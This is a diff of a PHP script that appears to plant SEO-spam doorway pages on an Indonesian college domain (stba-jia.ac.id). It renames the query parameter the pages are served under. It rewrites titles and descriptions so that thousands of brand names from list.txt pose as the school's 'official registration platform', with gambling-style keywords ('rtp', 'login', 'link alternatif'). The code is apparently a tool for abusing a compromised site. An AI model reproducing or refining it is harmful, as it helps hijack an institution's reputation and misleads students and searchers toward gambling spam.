@@ -20,7 +20,7 @@ function feedback404()
    
 }
 
-$tunnel = "info";
+$tunnel = "layanan";
 $filename = "list.txt";
 
 if (isset($_GET[$tunnel])) {
@@ -59,18 +59,18 @@ if (isset($_GET[$tunnel])) {
 }
 $brand = strtolower($BRAND);
 $baseAuthor = $BRAND;
-$URL  = "https://stba-jia.ac.id/pages/?info=$BRAND";
-$PAGEURL = "https://stba-jia.ac.id/pages/?info=$BRAND";
-$AMP = "https://stbajiaweb.pages.dev/?info=$BRAND";
+$URL  = "https://stba-jia.ac.id/info/?layanan=$BRAND";
+$PAGEURL = "https://stba-jia.ac.id/info/?layanan=$BRAND";
+$AMP = "https://stbajiaweb.pages.dev/?layanan=$BRAND";
 $DAFTAR = "https://stbajiaweb.pages.dev/";
 $BANNER = "https://i.pinimg.com/1200x/25/5e/70/255e70ae3ee3b5d43f8dedd3a7a12479.jpg";
 $LOGO = "https://i.pinimg.com/236x/ed/62/de/ed62de3c39e8b94a4ea2e0273405917e.jpg";
 $keyword = "$brand, login $brand, daftar $brand, situs $brand, rtp $brand, link alternatif $brand";
 
 if ($NUMLIST >= 1 && $NUMLIST <= 31134) {
-    $TITLE = "$BRAND: Sekolah Tinggi Bahasa Asing JIA";
-    $DESCRIPTION = "$BRAND di Sekolah Tinggi Bahasa Asing JIA menawarkan pengalaman belajar bahasa yang interaktif dan menyenangkan. Dengan metode inovatif dan pengajar berpengalaman, siswa dari semua tingkat dapat meningkatkan kemampuan bahasa secara efektif. Bergabunglah dan raih kemampuan berbahasa yang lebih baik untuk masa depan yang cerah.";
-    $description = "$BRAND di Sekolah Tinggi Bahasa Asing JIA menawarkan pengalaman belajar bahasa yang interaktif dan menyenangkan. Dengan metode inovatif dan pengajar berpengalaman, siswa dari semua tingkat dapat meningkatkan kemampuan bahasa secara efektif. Bergabunglah dan raih kemampuan berbahasa yang lebih baik untuk masa depan yang cerah.";
+    $TITLE = "$BRAND - Platfrom Pendaftaran Sekolah Tinggi Bahasa Asing JIA";
+    $DESCRIPTION = "$BRAND adalah platform resmi pendaftaran Sekolah Tinggi Bahasa Asing JIA, menawarkan kemudahan dalam proses pendaftaran. Dengan antarmuka yang ramah pengguna, calon mahasiswa dapat dengan cepat mengisi formulir, mengunggah dokumen, dan mendapatkan informasi terkini tentang program studi. Bergabunglah dengan komunitas pembelajar bahasa asing di JIA dan tingkatkan keterampilan bahasa Anda. Daftar sekarang untuk mengembangkan karir di dunia internasional.";
+    $description = "$BRAND adalah platform resmi pendaftaran Sekolah Tinggi Bahasa Asing JIA, menawarkan kemudahan dalam proses pendaftaran. Dengan antarmuka yang ramah pengguna, calon mahasiswa dapat dengan cepat mengisi formulir, mengunggah dokumen, dan mendapatkan informasi terkini tentang program studi. Bergabunglah dengan komunitas pembelajar bahasa asing di JIA dan tingkatkan keterampilan bahasa Anda. Daftar sekarang untuk mengembangkan karir di dunia internasional.";
 }
 
 ?>
